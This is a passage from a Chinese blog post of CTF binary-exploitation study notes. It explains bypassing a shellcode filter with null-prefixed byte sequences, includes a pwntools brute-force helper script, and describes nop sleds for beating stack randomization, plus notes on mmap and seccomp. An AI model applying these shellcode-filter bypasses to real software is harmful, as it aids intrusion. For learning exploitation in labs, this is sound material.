+<p>check（） 对传入shellcode 进行逐字符检查  检查到*i &#x3D;&#x3D; 0是退出 可以使用\x00绕过<br>跟进unk_400F20发现有足够空间写入shellcode（不顺利可能还需绕过以及shellcode长度限制）</p>
+<p>\x00B后面加上一个字符， 对应一个汇编语句.所以我们可以通过\x00B\x22、\x00B\x00 、\x00J\x00等等来绕过此检查.</p>
+<p>另一种常见绕过思路，我们绕过\x00即可.那怎么绕过呢？<br>脚本小子！(找汇编中的’\x00’)<br>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">            payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">            res = disasm(payload)</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                res != <span class="string">&quot; ...&quot;</span></span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">                <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res</span><br><span class="line">                ):</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
+
+<p><strong>nop sled</strong><br>一种可以破解栈随机化的缓冲区溢出攻击方式。 </p>
+<p>在实际的攻击代码前注入很长的 nop 指令 （无操作，仅使程 序计数器加一）序列， 只要程序的控制流指向该序列任意一处，程序计数器逐步加一，直到到达攻击代码的存在的地址， 并执行。</p>
+<p> 由于栈地址在一定范围的随机性，攻击者不能够知道攻击代码注入的地址，而要执行攻击代码需要 将函数的返回地址更改为攻击代码的地址（可通过缓冲区溢出的方式改写函数返回地址）。所以，只能在一定范围内（栈随机导致攻击代码地址一定范围内随机）枚举攻击代码位置（有依据的猜）</p>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不用 <span class="function"><span class="title">nop</span> sled ， 函数返回地址 -------&gt;</span> 攻击代码。</span><br><span class="line">使用 <span class="function"><span class="title">nop</span> sled ， 函数返回地址 -------&gt;</span> nop 序列（顺序执行） 直到攻击代码地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811142321120.png" alt="image-20230811142321120"></p>
+<p>本地缓冲区大小位0x1000</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811143658329.png" alt="image-20230811143658329"></p>
+<p>v2 &#x3D; rand() % 1337 - 668; ：这行代码使用 rand 函数生成一个随机数，并通过取模运算将其 限制在范围 0 到 1336 之间。然后，从结果中减去 668，得到一个范围在 -668 到 668 之间的随机整 数，并将其存储在变量 v2 中</p>
+<table>
+<thead>
+<tr>
+<th>较低地址</th>
+<th>&#x3D;&gt;</th>
+<th>&#x3D;&gt;</th>
+<th>&#x3D;&gt;</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>stk[ebp-0x15]</td>
+<td>ebp&#x3D;&gt;(旧ebp)</td>
+<td>return addr</td>
+<td>padding[0x10]</td>
+<td>buffer[0x1000]</td>
+</tr>
+</tbody></table>
+<h3 id="mmap（）函数主要三个用途"><a href="#mmap（）函数主要三个用途" class="headerlink" title="mmap（）函数主要三个用途"></a>mmap（）函数主要三个用途</h3><p>1.将一个普通文件映射到内存中。通常需要对文件进行频繁读写时使用，使得内存读写取代I&#x2F;O读写，获得较高性能。<br>2.将特殊文件进行匿名内存映射，为关联进程提供共享内存空间<br>3.为无关联的进程提供共享内存空间，一般也是将一个普通文件映射到内存中。</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">seccomp提示沙盒检查 </span><br><span class="line">seccomp-tools dump ./elf<span class="symbol">&#x27;s</span> name</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://yubut.github.io">yub</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://yubut.github.io/2022/11/08/Hot%20Time%20Exercising%20Records/">https://yubut.github.io/2022/11/08/Hot Time Exercising Records/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yubut.github.io" target="_blank">幻境</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Linux%EF%BC%8C%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87%EF%BC%8Cpwn/">Linux，知识碎片，pwn</a></div><div class="post_share"><div class="social-share" data-image="/../imgs/tag_per_img.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/08/27/%E8%8D%92%E8%AF%9E/" title="荒诞"><div class="cover" style="background: [object Object]"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">荒诞</div></div></a></div><div class="next-post pull-right"><a href="/2022/11/04/CSAPP%E9%98%85%E8%AF%BB%E7%A2%8E%E7%89%87/" title="CSAPP阅读碎片"><img class="cover" src="/../imgs/tag_per_img.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CSAPP阅读碎片</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">yub</div><div class="author-info__description">路迟青</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">40</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yubut" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://qm.qq.com/q/Le1ZeB0K40" target="_blank" title=""><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:3023536144@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hot-Time-Exercising-Records"><span class="toc-number">1.</span> <span class="toc-text">Hot Time Exercising Records</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Collection"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">Collection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%9B%B8%E7%AD%89%E6%80%A7%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">1) 相等性的比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B0%E6%AF%94%E8%BE%83"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">2) 无符号数比较</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B0%E6%AF%94%E8%BE%83"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">3) 有符号数比较</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mmap%EF%BC%88%EF%BC%89%E5%87%BD%E6%95%B0%E4%B8%BB%E8%A6%81%E4%B8%89%E4%B8%AA%E7%94%A8%E9%80%94"><span class="toc-number">1.0.1.</span> <span class="toc-text">mmap（）函数主要三个用途</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x1/" title="yubのAlgorithm.0x1"><img src="/../imgs/logo/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="yubのAlgorithm.0x1"/></a><div class="content"><a class="title" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x1/" title="yubのAlgorithm.0x1">yubのAlgorithm.0x1</a><time datetime="2024-11-08T06:28:43.000Z" title="发表于 2024-11-08 14:28:43">2024-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x2/" title="yubのAlgorithm.0x2"><img src="/../imgs/logo/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="yubのAlgorithm.0x2"/></a><div class="content"><a class="title" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x2/" title="yubのAlgorithm.0x2">yubのAlgorithm.0x2</a><time datetime="2024-11-08T06:28:43.000Z" title="发表于 2024-11-08 14:28:43">2024-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x3/" title="yubのAlgorithm.0x3"><img src="/../imgs/logo/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="yubのAlgorithm.0x3"/></a><div class="content"><a class="title" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x3/" title="yubのAlgorithm.0x3">yubのAlgorithm.0x3</a><time datetime="2024-11-08T06:28:43.000Z" title="发表于 2024-11-08 14:28:43">2024-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x10/" title="yubのAlgorithm.0x10"><img src="/../imgs/logo/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="yubのAlgorithm.0x10"/></a><div class="content"><a class="title" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x10/" title="yubのAlgorithm.0x10">yubのAlgorithm.0x10</a><time datetime="2024-11-08T06:28:43.000Z" title="发表于 2024-11-08 14:28:43">2024-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x4/" title="yubのAlgorithm.0x4"><img src="/../imgs/logo/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="yubのAlgorithm.0x4"/></a><div class="content"><a class="title" href="/2024/11/08/yub%E3%81%AEAlgorithm.0x4/" title="yubのAlgorithm.0x4">yubのAlgorithm.0x4</a><time datetime="2024-11-08T06:28:43.000Z" title="发表于 2024-11-08 14:28:43">2024-11-08</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By yub</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'WwVGEcmjEUSp1C3qQTlW8CcS-gzGzoHsz',
+      appKey: 'tqbDrZC8pSB03urdpjIK5oC9',
+      avatar: 'monsterid',
+      serverURLs: 'https://avoscloud.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: true
+    }, ))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="true" data-text="I,LOVE,YOU" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
